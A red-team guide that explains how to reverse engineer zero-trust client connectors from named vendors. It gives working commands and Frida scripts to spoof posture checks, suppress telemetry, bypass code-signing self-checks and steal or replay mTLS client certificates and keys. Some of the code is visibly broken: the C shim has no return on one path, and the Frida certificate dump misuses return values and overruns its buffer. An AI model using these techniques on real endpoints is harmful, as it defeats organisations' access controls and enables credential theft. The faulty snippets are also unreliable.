# ZTNA Client Connector Reverse Engineering Guide

## Introduction

ZTNA (Zero Trust Network Access) client connectors are the endpoint agents that anchor the SSE's identity and posture layer. Every major SSE vendor ships one: Zscaler ZPA Client Connector, Netskope Client, Cloudflare WARP, CATO Client, Microsoft Entra GSA Client, Tailscale, Twingate. These binaries hold:

- mTLS client certificates that authenticate to the SSE control plane.
- Posture attestation logic that gates access.
- Telemetry endpoints that report device health.
- Configuration cache including tenant info and policy revision.

Reverse engineering the client connector is the most powerful single technique in SSE red teaming. A successful reverse unlocks posture spoofing, telemetry suppression, mTLS cert theft, and policy revision rollbacks.

## Objectives

By the end of this guide the operator should be able to:

- Identify the client connector binary on each OS.
- Extract strings, configuration, and embedded credentials.
- Hook posture functions with Frida.
- Bypass code-signing self-checks.
- Extract the mTLS client cert for offline replay.

## Target Inventory

| Vendor | macOS Path | Linux Path | Windows Path |
|--------|------------|------------|--------------|
| Zscaler ZPA | `/Applications/Zscaler/ZscalerClientConnector.app/Contents/MacOS/ZscalerClientConnector` | `/opt/zscaler/bin/zpa-connector` | `C:\Program Files\Zscaler\ZSATunnel\ZSATunnel.exe` |
| Netskope | `/Applications/Netskope/STAgentUI.app/Contents/MacOS/STAgentUI` | `/usr/local/netskope/stagentui` | `C:\Program Files\Netskope\STAgent\STAgentUI.exe` |
| Cloudflare WARP | `/Applications/Cloudflare WARP.app/Contents/MacOS/CloudflareWARP` | `/usr/local/sbin/warp-svc` | `C:\Program Files\Cloudflare\Cloudflare WARP\Cloudflare WARP.exe` |
| CATO Client | `/Applications/CatoClient` | `/opt/cato/cato-client` | `C:\Program Files\Cato Networks\CatoClient\CatoClient.exe` |
| Microsoft Entra GSA | `/Applications/Microsoft Entra Global Secure Access.app/` | N/A (Linux not supported) | `C:\Program Files\Microsoft\Entra\GSA\GSA.exe` |
| Tailscale | `/Applications/Tailscale.app/Contents/MacOS/Tailscale` | `/usr/sbin/tailscaled` | `C:\Program Files\Tailscale\tailscaled.exe` |
| Twingate | `/Applications/Twingate.app/` | `/usr/sbin/twingated` | `C:\Program Files\Twingate\Twingate.exe` |

## Reconnaissance: Strings and Symbols

### 3.1 Static string extraction

```bash
# Extract printable strings (>= 6 chars) from the binary
strings -a -n 6 /Applications/Cloudflare\ WARP.app/Contents/MacOS/CloudflareWARP \
  > /tmp/warp-strings.txt

# Search for telemetry endpoints
grep -i -E "logs|telemetry|posture|attest|api" /tmp/warp-strings.txt
# Expected hits:
# logs.cloudflareclient.com
# device-attestation.cloudflareclient.com
# https://api.cloudflare.com/client/v4/...
```

### 3.2 Symbol table (if not stripped)

```bash
# macOS Mach-O symbols
nm -gU /Applications/Zscaler/ZscalerClientConnector.app/Contents/MacOS/ZscalerClientConnector \
  | grep -i -E "posture|attest|telemetry|cert"
# Expected:
# _posture_check
# _posture_report
# _evaluate_cert
```

### 3.3 Embedded PEM certificates

```bash
# Find PEM blocks in binary
strings -a /opt/zscaler/bin/zpa-connector | grep -E "BEGIN|END" | head -20
# -----BEGIN CERTIFICATE-----
# -----END CERTIFICATE-----
# -----BEGIN RSA PRIVATE KEY-----
# -----END RSA PRIVATE KEY-----

# Extract embedded cert
awk '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/' \
  <(strings -a /opt/zscaler/bin/zpa-connector) > /tmp/embedded-cert.pem
openssl x509 -in /tmp/embedded-cert.pem -noout -subject -issuer
```

## Configuration Cache

Most agents cache config to disk in JSON or plist format.

```bash
# Zscaler ZPA macOS
cat "/Library/Application Support/Zscaler/Zscaler/.zscalerinfo"
# Contains: tenant, enrollment_url, pac_url, policy_revision

# Cloudflare WARP macOS
cat "/Library/Application Support/Cloudflare/mdm.txt"
# Contains: organization, auth_client_id, gateway_fqdn

# Netskope macOS
cat "/Library/Application Support/Netskope/STAgentUI/posture.json"
# Posture JSON, modifiable

# CATO Client Linux
cat /opt/cato/cato-client/config.ini
# Contains: tenant, api_endpoint
```

## Frida Hooks

### 5.1 Hook SSL_CTX_use_certificate_file to capture cert paths

```javascript
// frida -n ZscalerClientConnector -l cert-hook.js
Interceptor.attach(Module.findExportByName(null, 'SSL_CTX_use_certificate_file'), {
  onEnter: function(args) {
    var path = args[1].readCString();
    send('[+] Cert path: ' + path);
  }
});
```

### 5.2 Hook posture_check to spoof return value

```javascript
// Identify the export (macOS)
var posture = Module.findExportByName(null, 'posture_check');
if (posture) {
  Interceptor.attach(posture, {
    onLeave: function(retval) {
      send('[+] posture_check orig: ' + retval);
      retval.replace(0x01);
      send('[+] spoofed: 0x01');
    }
  });
}

// Linux fallback (symbol stripped)
var funcs = Module.enumerateExports('zpa-connector');
funcs.forEach(function(f) {
  if (f.name.indexOf('posture') !== -1) {
    send('[+] Found: ' + f.name);
  }
});
```

### 5.3 Hook SSL_write to inspect outbound traffic

```javascript
Interceptor.attach(Module.findExportByName(null, 'SSL_write'), {
  onEnter: function(args) {
    var buf = args[1];
    var len = args[2].toInt32();
    var data = Memory.readUtf8String(buf, Math.min(len, 1024));
    send('[SSL_write] ' + data);
  }
});
```

## Code-Signing Self-Checks

Some agents (notably Cloudflare WARP post-2024) perform `codesign --verify` on themselves at launch. If the binary has been modified, the agent refuses to start.

### 6.1 Disable code-signing self-check (macOS, lab only)

```bash
# SIP must be disabled (lab)
# Reboot to Recovery, run: csrutil disable

# Strip existing signature
sudo codesign --remove-signature /Applications/Cloudflare\ WARP.app/Contents/MacOS/CloudflareWARP

# Patch out the codesign verification call
# Find the call site:
#   otool -tv CloudflareWARP | grep -A 5 _codesign_check
# NOP out the call (lab)

# Re-sign with self-signed cert
codesign -s - /Applications/Cloudflare\ WARP.app/Contents/MacOS/CloudflareWARP
```

### 6.2 Linux LD_PRELOAD bypass

```c
// fake_codesign.c
#include <string.h>
int system(const char *cmd) {
  if (strstr(cmd, "codesign") || strstr(cmd, "dpkg -V")) {
    return 0;  // pretend success
  }
  // Real system call
}
```

```bash
gcc -shared -fPIC -o fake_codesign.so fake_codesign.c
LD_PRELOAD=./fake_codesign.so /opt/cato/cato-client
```

## mTLS Client Cert Extraction

The mTLS client cert is the SSE credential. Stealing it grants the operator the same privileges as the connector.

### 7.1 Linux cert extraction

```bash
# CATO Networks
sudo cp /opt/cato/certs/client.pem /tmp/cato-client.pem
sudo cp /opt/cato/certs/client.key /tmp/cato-client.key
sudo chown $USER /tmp/cato-client.*

# Test the cert
curl --cert /tmp/cato-client.pem --key /tmp/cato-client.key \
     https://api.catonetworks.com/v1/health
```

### 7.2 macOS Keychain extraction

```bash
# Find the cert in the system keychain
security find-certificate -a -c "Zscaler" /Library/Keychains/System.keychain

# Export the cert and key (requires sudo)
security export -k /Library/Keychains/System.keychain -t identities \
  -f pemseq -o /tmp/zscaler-ident.pem
```

### 7.3 Runtime extraction via Frida

```javascript
// Hook SSL_CTX_use_certificate to dump in-memory cert
Interceptor.attach(Module.findExportByName(null, 'SSL_CTX_use_certificate'), {
  onLeave: function(retval) {
    var x509 = retval;
    // BIO_new_memory BIO_read
    var bio = Module.findExportByName(null, 'BIO_new')(Module.findExportByName(null, 'BIO_s_mem')());
    Module.findExportByName(null, 'PEM_write_bio_X509')(bio, x509);
    var buf = Memory.alloc(8);
    var len = Module.findExportByName(null, 'BIO_read')(bio, buf, 4096);
    var pem = Memory.readUtf8String(buf, len);
    send('[CERT] ' + pem);
  }
});
```

## Practice / Lab Walkthrough

Authorized-lab exercise:

1. Install Zscaler ZPA Client Connector on a lab macOS device with SIP disabled.
2. Extract strings and identify telemetry endpoints.
3. Block telemetry endpoints via `/etc/hosts`.
4. Use Frida to hook `posture_check`. Verify return value is spoofed.
5. Extract mTLS client cert from keychain. Test offline.
6. Install Cloudflare WARP. Strip code signature. Verify the bypass.

## References & Resources

- Frida — `frida.re`
- Frida CodeShare — `codeshare.frida.re`
- Project Zero issue #2847 — Frida-on-endpoint-agent pattern
- Black Hat USA 2023 — *Disarming the Endpoint Agent*

---

*End of guide. For vendor-specific cheatsheets see `quick-reference-card.md`.*
